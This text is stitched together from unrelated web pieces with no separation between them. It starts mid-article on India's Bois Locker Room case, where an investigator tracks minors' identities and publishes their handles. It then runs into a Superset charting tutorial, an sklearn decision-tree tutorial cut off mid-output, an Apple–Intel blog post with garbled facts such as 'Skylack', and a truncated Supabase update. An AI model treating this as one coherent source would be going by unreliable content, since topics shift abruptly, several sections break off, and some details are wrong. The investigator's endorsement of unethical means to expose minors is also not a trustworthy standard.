<p>Several weeks after Madhuri’s exchange with the boy, screenshots from the Bois Locker Room were leaked onto <a href="https://www.indiatoday.in/india/story/bois-locker-room-delhi-schoolboys-create-group-to-share-lewd-photos-chats-on-classmates-1674303-2020-05-04">social media</a> after <a href="https://www.instagram.com/ashnaaasharmaa/">@ashnaaasharmaa</a>, an Instagram influencer, <a href="https://www.instagram.com/stories/highlights/17890085584516759/">shared</a> a list of the boys’ handles and requested that her followers expose “[t]hese cunts.” The story revealed that most of the boys attended several prominent private schools in Saket, an affluent South Delhi suburb. The details were shocking: In the chat — which included roughly 30 boys, some as young as 15 — the boys rated the attractiveness of underage girls’ bodies and exchanged their personal information. Some even shared lewd tales of alleged<strong> </strong>sexual encounters with the girls. National media outlets <a href="https://qz.com/india/1850737/delhi-boyslockerroom-chat-puts-spotlight-on-india-rape-culture/">swarmed</a> over the story, as Indian social media erupted in outrage. As <a href="https://pbs.twimg.com/media/EXKrLUnUEAE3SAs.jpg">more screenshots</a> from the chat emerged, the group members threatened to rape or leak nude photographs of the whistleblowers. One said: “I am going to Fuck every single [girl] who posted on their story” — a threat newspapers interpreted as rape.&nbsp;</p>

<p>But the Bois’ plans for revenge would be foiled, thanks in part to Singh. Over a Skype <em>chai</em> in late May,<strong> </strong>he told <em>Rest of World</em> that an influencer had tipped him off about the case by tagging him in an Instagram story and asking for his assistance in finding the boys. He said that soon after the story appeared, his inbox was flooded with screenshots from alleged victims. “On an average day, I get 10 to 20 messages,” he said, “but this time, I must have gotten over 200.” He had only a few blurred screenshots from the Bois’ chat that had gone viral — fearing public retaliation, members had deleted their Instagram accounts, seemingly eliminating any evidence. How, then, did he track them down? “Us ethical hackers, we have our techniques,” he grinned.&nbsp;</p>



<p>Singh explained that he first asked the girls who had approached him to send him screen recordings to confirm their stories. Next, he used a special tracking software to find their email addresses via their Instagram handles. After confirming those addresses, he searched Facebook for accounts registered under those emails and compared their Instagram pictures to those<strong> </strong>posted to<strong> </strong>their Facebook accounts.<strong> </strong>Once he confirmed the identities of the nine boys who were active participants in the leaked chats, Singh forwarded a WhatsApp message containing his findings<strong> </strong>to a police officer in New Delhi. He received no response. So he tracked down the boys’ parents and called them. “Since they were minors,” he said, “I wouldn’t speak to them directly. But their parents needed to know what their children were up to. I recommended that the boys seek counseling.”&nbsp;</p>



<p>Singh then shared the names of the nine boys on his own Instagram account. Their handles were also posted publicly by “<a href="https://www.instagram.com/wallofshamereal/?hl=en">Wall of Shame Real</a>,” an anonymous Instagram page that names and shames alleged sexual offenders. Its administrator invited the page’s 35,000-plus followers to bring forward more screenshots and stories of harassment that could be used as evidence against the boys. “Their parents have been informed. Now, for the real action, you need to step up and help sir [Singh] in the case,” the post read. (The administrator of the Wall of Shame Real page did not return<em> Rest of World</em>’s request for comment.)&nbsp;</p>

<p>On May 6, the <a href="https://www.hindustantimes.com/delhi-news/admin-of-instagram-group-bois-locker-room-arrested-devices-seized/story-9tQDaF32QglX2tnyGPP6wI.html"><em>Hindustan Times</em> reported</a> that the Delhi police had apprehended an administrator of the group chat — the result of a social media furor fomented, in large part, by Singh. With their elite private-school pedigrees and social-media savvy, these boys seemed to alert India to a generation of young people doing whatever they wanted to whomever they chose to — as much online as elsewhere in the world. It is still unclear what the consequences will be for the boys of Bois Locker Room, though many have been questioned by the police in recent weeks.</p>



<p>Singh’s decision to share the boys’ Instagram handles, some of which revealed their full names, seemed to skirt an ethical line. But he insisted that their handles had already been shared publicly before his involvement in the matter. “I don’t believe in trial by social media. Instagram is not a courtroom. I always verify my claims before I post them,” he said. At the same time, he acknowledged: “Sometimes, to get justice, you need to do unethical things.”</p>



<p>The Bois Locker Room<strong> </strong>case struck a chord with Indians still convulsed with anger over the treatment of women in their country. In 2012, a fatal gang rape on a bus in Delhi enraged the country and spurred legal and judicial reforms. Yet the horror remains. According to the <a href="https://www.reuters.com/article/us-india-rape-factbox/statistics-on-rape-in-india-and-some-well-known-cases-idUSKBN1YA0UV">latest statistics</a>, every day, 90 rapes are reported in India, but many more go unreported, due to fears and stigma.&nbsp;In the first three and a half months of 2018, more than five women were raped every day in the capital city. In February, a man <a href="https://www.bbc.co.uk/news/world-asia-india-51398295">allegedly raped a 5-year-old girl</a> within the grounds of the U.S. Embassy in Delhi.&nbsp;</p>



<p>Critics argue that the government has failed to address the heart of the problem: cultural notions of purity that lead third parties, particularly law enforcement, to blame the victim. A longtime police inspector with the<strong> </strong>Mumbai Crime Branch, who spoke to <em>Rest of World</em> on condition of anonymity, said that victims of sex crimes directly approach private investigators such as Singh out of convenience, not frustration. “If you lodge a claim, you will have to be questioned, have a character certificate taken … these things take a few days. People think going to the police is a waste of time — if I advertised free private help on Facebook, why wouldn’t people come to me? It’s just easier.”&nbsp;</p>



<p>The inspector disagreed that police fail to adequately protect sexual-harassment victims. “There may have been cases where officers behaved badly, but the government has now made lots of changes to help girls feel more comfortable approaching the police,” he said. “There are dedicated lady officers and help lines for sexual-harassment cases.”&nbsp;</p>



<p>The numbers would appear to back him up: Between 2012 and 2015, cases of rape reported to the police increased by 39%, perhaps suggesting victims have become more willing to come forward. But victims still claim law enforcement dissuades them from pressing charges. They often suffer humiliation at police stations and hospitals, according to a 2017 <a href="https://www.hrw.org/report/2017/11/08/everyone-blames-me/barriers-justice-and-support-services-sexual-assault-survivors">paper</a> by Human Rights Watch. Even when police do cooperate with victims, the legal system often fails them. According to 2018 data from India’s National Crime Records Bureau, only <a href="https://economictimes.indiatimes.com/news/politics-and-nation/conviction-in-crimes-against-dalits-is-abysmally-low-mha-report/articleshow/63833473.cms">27.2%</a>&nbsp;of state prosecutions for rape in India led to a conviction. By contrast, the <a href="https://www.cps.gov.uk/cps/news/annual-violence-against-women-and-girls-report-published-0">corresponding figure</a> for 2017 to 2018 in the United Kingdom stood at 58%.&nbsp;</p>



<p>Rukmini Sen, a sociologist with the Ambedkar University Delhi, said India’s male-dominated police force still stigmatizes victims of sexual violence. “Time and again, various initiatives are announced … and clearly all of these attempts have either not been properly carried forward or have not created enough confidence in women,” she said.&nbsp;</p>

<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>

<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>
<h2 id="time-series-bar-chart"><a href="#time-series-bar-chart" aria-label="time series bar chart permalink"></a>Time Series Bar Chart</h2>
<p>Time series bar charts represent categories by vertical charts.</p>

<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>

<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>

<h2 id="area-chart"><a href="#area-chart" aria-label="area chart permalink"></a>Area Chart</h2>
<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>

<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>

<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},
  {'criterion': 'gini', 'max_depth': 5},
  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},
  {'criterion': 'entropy', 'max_depth': 3},

			<p><a href="#"><img alt="Of WWDC, Intel, and some ramblings about what this might mean" src="https://www.quintersol.com/wp-content/uploads/2020/06/IntelApple.jpeg"></a></p><!-- .entry-header --><p>So <a href="https://developer.apple.com/wwdc20/">WWDC 2020</a> – Apple’s Worldwide Developers Conference happened last week, between the 22nd and 26th of June. Despite being the first-ever virtual-only WWDC due to the Covid-19 pandemic, a lot happened:</p>
<ul>
<li>iOS 14 is now available in beta for developers,</li>
<li>we now have Scribble to help us to literally ‘scribble’ on our iOS devices,</li>
<li>we can arrange our widgets on the home screen,</li>
<li>get cycling directions (EV Routing),</li>
<li>and have Digital Car Keys.</li>
</ul>
<div id="attachment_3970"><p><img aria-describedby="caption-attachment-3970" src="https://www.quintersol.com/wp-content/uploads/2020/06/iOS14.jpeg" alt="WWDC2020, iOS14" width="680" height="383" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/iOS14.jpeg 680w, https://www.quintersol.com/wp-content/uploads/2020/06/iOS14-300x169.jpeg 300w, https://www.quintersol.com/wp-content/uploads/2020/06/iOS14-600x338.jpeg 600w" sizes="(max-width: 680px) 100vw, 680px"></p><p id="caption-attachment-3970">WWDC2020, iOS14</p></div>
<p>All these announcements and more were by all means exciting, including the all amazing Big Sur to customize our Memoji on our Macs. <a href="https://www.youtube.com/watch?v=4An0ndagZsQ">Watch here</a> in case you missed #WWDC2020 and want to catch a glimpse.</p>
<p>However, the most shocking announcement, which we really are all talking about is the <a href="https://www.nytimes.com/2020/06/22/technology/apple-macs-intel-chips.html">Big Break up between Apple and Intel</a>. Well, it doesn’t entirely come as a shocker, as <a href="https://www.cnbc.com/2020/06/09/apple-reportedly-to-switch-from-intel-processors-in-macs.html">Steve Jobs had implied it. But that was 15 years ago.</a></p>
<p>So, today, we take you with us down this rabbit hole, with a little snooping around, since after all, Apple’s and Intel’s is our business too, so it’s kind of okay if we put our nose in it.</p>
<h2>The reception of the news</h2>
<p>We did a little snooping as we went down this rabbit hole just to get ‘the sentiments’. There were people who as usual turned to our de facto way of communicating these days: memes.</p>
<div id="attachment_3972"><p><img aria-describedby="caption-attachment-3972" src="https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon.png" alt="Apple Ditches Intel" width="1366" height="768" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon.png 1366w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-300x169.png 300w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-1024x576.png 1024w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-768x432.png 768w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-600x337.png 600w" sizes="(max-width: 1366px) 100vw, 1366px"></p><p id="caption-attachment-3972">Apple Ditches Intel</p></div>
<p>And like many of us, we began to wonder why. Could it be that Apple wants to ‘pack some more power’ into their batteries?</p>

<div id="attachment_3975"><p><img aria-describedby="caption-attachment-3975" src="https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1.png" alt="Intel Battery Power" width="559" height="681" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1.png 559w, https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1-246x300.png 246w" sizes="(max-width: 559px) 100vw, 559px"></p><p id="caption-attachment-3975">Intel Battery Power</p></div>
<h2>What caused the breakup?</h2>
<p>Since we are curious human beings with a little detective muscle in us that we like to exercise a bit (we don’t want to suffer from atrophy), we sought to get to the bottom of this turn of events.</p>
<p>Better still, on a more serious note, because we are techies, we need to understand what implications this has in the industry as a whole. We code in Swift, by the way.</p>
<p>And thirdly, even more seriously, we are a business and no one just leaves their 15-year long partnership without a good reason.</p>
<h3>Conspiracy theories</h3>
<p>There are a lot of conspiracy theories going around since Apple did not officially state the reason for the breakup.</p>
<h3>Conspiracy theory #1</h3>
<p>Like we have mentioned, Steve Jobs had implied that the break up would be inevitable. He said that Intel would be pivotal in helping Apple build powerful computers for the ‘next decade’. He did not say whether the processors would still be relevant after that, which implied that there was a likely breakup.</p>
<h3>Conspiracy theory #2</h3>
<div id="attachment_3976"><p><a href="https://www.researchgate.net/figure/Skylake-CPU-and-Arria-10-FPGA-from-Intel-Intel-Hybrid-chips-that-combine-FPGAs-with_fig1_329894874"><img aria-describedby="caption-attachment-3976" src="https://www.quintersol.com/wp-content/uploads/2020/06/skylake.jpg" alt="Intel-Apple Skylake" width="283" height="286" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/skylake.jpg 283w, https://www.quintersol.com/wp-content/uploads/2020/06/skylake-100x100.jpg 100w" sizes="(max-width: 283px) 100vw, 283px"></a></p><p id="caption-attachment-3976">Intel-Apple Skylake</p></div>
<p>According to <a href="https://youtu.be/JImi0Vnjvfw">François Piednoël, Former Intel Corp Performance Guru</a> Skylack’s line of processors’ Quality Assurance was ‘bad’. In his words, “Our buddies at Apple became the number one filers of problems in the Architecture”.</p>
<p>The numerous bugs on Skylack were the straw stroke that broke the camel’s back, for an Apple that was already contemplating on moving on from their processor partner, Intel. François also cited internal wrangles within Intel.</p>
<h2>What does this all mean?</h2>
<p>So as we try to process this new shocker, this news means several things. Let’s explore them below:</p>
<h3>#1 Apple definitely has more control</h3>
<p>Apple will be able to consolidate its devices and software to run seamlessly and cross-platform. iOS and iPadOS apps will be able to run on Mac, for example. The company will also be able to make higher quality products with higher processing speeds and that can do the ‘heavy lifting’, for example, gaming.</p>
<h3>#2 Apple users might want to wait for the new ARM/silicon-based Macs</h3>
<p>A survey by @tiborbodecs on Twitter showed that users might want to take this route:</p>
<div id="attachment_3977"><p><img aria-describedby="caption-attachment-3977" src="https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503.jpeg" alt="Apple ARM-based Macs" width="947" height="1950" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503.jpeg 947w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-146x300.jpeg 146w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-497x1024.jpeg 497w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-768x1581.jpeg 768w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-746x1536.jpeg 746w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-600x1235.jpeg 600w" sizes="(max-width: 947px) 100vw, 947px"></p><p id="caption-attachment-3977">Apple ARM-based Macs</p></div>
<p>Since the transition will take two years, Intel-based products still in the pipeline will still be released. The only problem could be that users may not want to buy them.</p>
<h3>#3 Old Intel-based apps will continue to work on the new ARM-based Macs</h3>
<p>Apple had already laid the groundwork with <a href="https://www.apple.com/rosetta/index.html">Rossetta 2</a>, an emulator that is able to compile code written to run on Intel architecture to run on ARM. The company will also continue to support Intel-based Macs. So, don’t ditch your Mac yet.</p>
<p>Intel-based apps will run slower on the new Macs, though, as Rossetta will need time to translate the code.</p>
<h3>#4 Developers need to upskill to build apps that can run on the new ARM-based Macs</h3>
<p>Rossetta is only a temporary solution. For developers, you are better off getting the <a href="https://developer.apple.com/programs/universal/">Developer Transition Kit </a>to prepare yourself to start building native apps to run on the new ARM-based Macs, come 2021.</p>
<div id="attachment_3978"><p><a href="https://developer.apple.com/programs/universal/"><img aria-describedby="caption-attachment-3978" src="https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09.png" alt="Apple Developer Transition Kit" width="1366" height="768" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09.png 1366w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-300x169.png 300w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-1024x576.png 1024w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-768x432.png 768w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-600x337.png 600w" sizes="(max-width: 1366px) 100vw, 1366px"></a></p><p id="caption-attachment-3978">Apple Developer Transition Kit</p></div>
<h3>#5 Big Tech Companies might follow suit</h3>
<p>To an extent, Apple’s move from Intel’s x86’s processors is a benchmark. If the transition is successful, then other companies are likely to follow suit. In an interview with <a href="https://fortune.com/2020/06/09/apple-intel-arm-chip-shift-mac/">Fortune Magazine</a>, HP and Acer said they had laptop models powered by ARM-based chips. Samsung and Lenovo do have ARM-based laptops too.</p>
<h2>When should we expect new Macs?</h2>
<p>The<a href="https://9to5mac.com/2020/06/21/kuo-13-3-inch-macbook-pro-and-imac-will-be-the-first-arm-macs-to-be-released-as-soon-as-q4-after-redesigned-intel-imac-launch/"> first ARM-based Mac</a> is set to be released in Q4, 2020, or in Q1, 2021, and they are highly likely to result in a 50 to 100% increase in performance when compared to their older Intel-based counterparts. We should have an ARM-based Macbook by mid-2021.</p>
<h2>In conclusion</h2>
<p>Apple might have brought back the good ol’ days where processor speed was a thing:</p>

<p>All the same, we are all waiting to see how things will unfold.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>We're now 4 months into building <a href="https://supabase.io/">Supabase</a>, which means another major update. Here's a few things we think you'll love in this release.</p><h3>4 minute demo</h3><p>Watch a full demo:</p><h3>View relational data</h3><p>We're sometimes asked how we will make Postgres as simple as Firebase, since Postgres is a relational database. This month we're making our first steps to prove that relational databases can be even easier to use than document stores. We're releasing an excel-like editing interface which can drill down into your relational data.</p><h3>Manage JSON data</h3><p>Postgres is an amazing database, giving the flexibility of a document store with the power of a RDBMS. If you use <code>JSON</code> data in Postgres, then we want to make that easy too. Supabase detects when your column is <code>JSON</code> or <code>JSONB</code>, and provides an easy way to edit and view your data. More improvements coming soon for this feature!</p><h3>Choose your region</h3><p>If you noticed a bit of latency on Supabase, it's because your projects were previously set up in Singapore. It was always our intention that you'd be able to choose your database region, and this month we've delivered it. In the next releases we'll even allow you to go multi-region, instantly replicating your database close to your customers.</p><h3>Backups</h3><p>A guiding principle at Supabase is zero lock-in. So this month we are exposing your daily database backups on the dashboard, giving you a simple way to migrate off Supabase. We have a lot more to build in this space (<code>WAL-G!</code>), so watch this space.</p><h3>Kaizen</h3><p>We have a number of small improvements:</p><ul><li>Improved SQL editor - with better syntax highlighting</li><li>Improved API docs - with 